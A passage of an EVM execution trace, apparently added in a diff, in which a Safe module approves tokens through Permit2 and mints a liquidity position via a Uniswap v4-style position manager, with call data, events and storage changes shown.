+    │   │   │   │   ├─ [643624] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModuleReturnData(0xCb14A7ACe59b7A7B19Ba3Fee0F3A37d23fa62157, 0, 0xde792d5f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001, 1)
+    │   │   │   │   │   ├─ [643024] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModuleReturnData(0xCb14A7ACe59b7A7B19Ba3Fee0F3A37d23fa62157, 0, 0xde792d5f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001, 1) [delegatecall]
+    │   │   │   │   │   │   ├─ [635500] 0xCb14A7ACe59b7A7B19Ba3Fee0F3A37d23fa62157::execute([0x620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab, 0x00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff], [0x6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f00000000000000, 0x000000000000000000000000000000000000000000000000000000000000000a, 0x0000000000000000000000000000000000000000000000000000000000000014, 0x00000000000000000000000000000000000000000000009d3595ab2438adc594, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x00000000000000000000000000000000000000000000009d3595ab2438adc594, 0x0000000000000000000000000000000000000000000000000000000000000001]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [620560] 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB::620d97cf(6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f00000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000009d3595ab2438adc5940000000000000000000000000000000000000000000000000000000000000001)
+    │   │   │   │   │   │   │   │   ├─ [2280] 0xC995618863a7D749357ac3192fA2f329f512a958::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c62d6fdc4e77c4d006784bc4805703b37ffcc4b7
+    │   │   │   │   │   │   │   │   ├─ [610536] 0xC62d6FDC4e77C4d006784bc4805703b37fFCc4b7::620d97cf(6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f00000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000009d3595ab2438adc5940000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [3309] 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB::safe() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [280] 0xC995618863a7D749357ac3192fA2f329f512a958::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c62d6fdc4e77c4d006784bc4805703b37ffcc4b7
+    │   │   │   │   │   │   │   │   │   │   ├─ [2312] 0xC62d6FDC4e77C4d006784bc4805703b37fFCc4b7::safe() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8
+    │   │   │   │   │   │   │   │   │   ├─ [7301] 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e::poolKeys(0x6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   ├─ [5946] 0x7fFE42C4a5DEeA5b0feC41C94C136Cf115597227::getSlot0(0x6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f9b8dc78248b536) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [2375] 0x000000000004444c5dc75cB358380D2e3dE08A90::extsload(0xe5e5db7127227aee56a0a934fcf3575b0b94f2e4997ea595d16347c03bb6f19e) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000001f40000000000000000000000000001000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001f4
+    │   │   │   │   │   │   │   │   │   ├─ [1309] 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB::safe() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [280] 0xC995618863a7D749357ac3192fA2f329f512a958::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c62d6fdc4e77c4d006784bc4805703b37ffcc4b7
+    │   │   │   │   │   │   │   │   │   │   ├─ [312] 0xC62d6FDC4e77C4d006784bc4805703b37fFCc4b7::safe() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8
+    │   │   │   │   │   │   │   │   │   ├─ [30657] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModuleReturnData(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba300000000000000000000000000000000000000000000009d3595ab2438adc594, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [30275] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModuleReturnData(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba300000000000000000000000000000000000000000000009d3595ab2438adc594, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [25269] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 2899999999999997756820 [2.899e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24657] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 2899999999999997756820 [2.899e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, spender: 0x000000000022D473030F116dDEE9F6B43aC78BA3, amount: 2899999999999997756820 [2.899e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x2bbea0206622d98c29eed16b53791ff35e58eae7622e136a8703af29e40a6363: 0 → 0x00000000000000000000000000000000000000000000009d3595ab2438adc594
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [30946] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModule(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0, 0x87517c450000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b1000000000000000000000000bd216513d74c8cf14cf4747e6aaa6420ff64ee9e00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000006aa8cbcb, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [30561] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModule(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0, 0x87517c450000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b1000000000000000000000000bd216513d74c8cf14cf4747e6aaa6420ff64ee9e00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000006aa8cbcb, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [25450] 0x000000000022D473030F116dDEE9F6B43aC78BA3::approve(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, 2899999999999997756820 [2.899e21], 1789447115 [1.789e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(param0: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, param1: 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, param2: 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, param3: 2899999999999997756820 [2.899e21], param4: 1789447115 [1.789e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x449b0108364ff9496dde7137d67502e9c4e6f8ea48aec6bceb6c51be7481bc78: 0 → 0x00000000000000006aa8cbcb00000000000000000000009d3595ab2438adc594
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [30184] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModuleReturnData(0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000001, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [29802] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModuleReturnData(0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000001, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [24296] 0x8762788ba3ecEe7B61Fc7578A3533433E20461F5::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 1)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, spender: 0x000000000022D473030F116dDEE9F6B43aC78BA3, amount: 1)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x906650aff8420cd88e2418a08c39e0f733bea5adeda54e508549b2bbb5728ce0: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [28446] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModule(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0, 0x87517c450000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5000000000000000000000000bd216513d74c8cf14cf4747e6aaa6420ff64ee9e0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000006aa8cbcb, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [28061] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModule(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0, 0x87517c450000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5000000000000000000000000bd216513d74c8cf14cf4747e6aaa6420ff64ee9e0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000006aa8cbcb, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [25450] 0x000000000022D473030F116dDEE9F6B43aC78BA3::approve(0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, 1, 1789447115 [1.789e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(param0: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, param1: 0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, param2: 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, param3: 1, param4: 1789447115 [1.789e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x481132f6ba527701b124a52c72169767c742b322d6bd3018315fafec41260cc4: 0 → 0x00000000000000006aa8cbcb0000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [2766] 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e::nextTokenId() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000062b69
+    │   │   │   │   │   │   │   │   │   ├─ [355771] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModule(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, 0, 0xdd46508f0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000006aa8cbcb0000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba80000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [355246] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModule(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, 0, 0xdd46508f0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000006aa8cbcb0000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba80000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [352495] 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e::modifyLiquidities(0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba80000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5, 1789447115 [1.789e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [350007] 0x000000000004444c5dc75cB358380D2e3dE08A90::unlock(0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba80000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [347920] 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e::unlockCallback(0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f500000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d00000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000000100000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba80000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000002d62109243b87c4ba3ee7ba1d91b0dd0a074d7b10000000000000000000000008762788ba3ecee7b61fc7578a3533433e20461f5)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, value: 404329 [4.043e5])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [113436] 0x000000000004444c5dc75cB358380D2e3dE08A90::modifyLiquidity((0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 500, 10, 0x0000000000000000000000000000000000000000), (10, 20, 5804641566284224395546125 [5.804e24], 0x0000000000000000000000000000000000000000000000000000000000062b69), 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xf208f4912782fd25c7f114ca3723a2d5dd6f3bcc3ac8db5af63baa85f711d5ec
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │        topic 1: 0x6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f9b8dc78248b536
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000bd216513d74c8cf14cf4747e6aaa6420ff64ee9e
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d0000000000000000000000000000000000000000000000000000000000062b69
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x73ea864c26bb5aa019b751250b23c06904046af63a0e93bcec85e1aebfb5b9ce: 0 → 0x000000000004cd2e3ff51269e9e50e0d000000000004cd2e3ff51269e9e50e0d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x852bda5858513a6e3bb1a3b8d7ba74bfb5744421d397c313bdc21c92968436dd: 0 → 0xfffffffffffb32d1c00aed96161af1f3000000000004cd2e3ff51269e9e50e0d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x201f2411f4415fa37b0d7bbf5d0ce80b77e7f05eddab1a2c7528ea87b65f5a7d: 0 → 6
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xae2bfdcca200886f2780cd7a5f65df2ef7d931036365d76d31b8206cb36bdec8: 0 → 0x00000000000000000000000000000000000000000004cd2e3ff51269e9e50e0d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffff62ca6a54dbc7523a6c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [859] 0x000000000004444c5dc75cB358380D2e3dE08A90::exttload(0x98e152f528dbd1998842f3a78fa99763ea0d8b51c67c53c5f0e035a643c2b537) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffffffff62ca6a54dbc7523a6c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7167] 0x000000000004444c5dc75cB358380D2e3dE08A90::sync(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5794] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x000000000004444c5dc75cB358380D2e3dE08A90) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x000000000004444c5dc75cB358380D2e3dE08A90) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 635415632396963 [6.354e14]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 635415632396963 [6.354e14]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
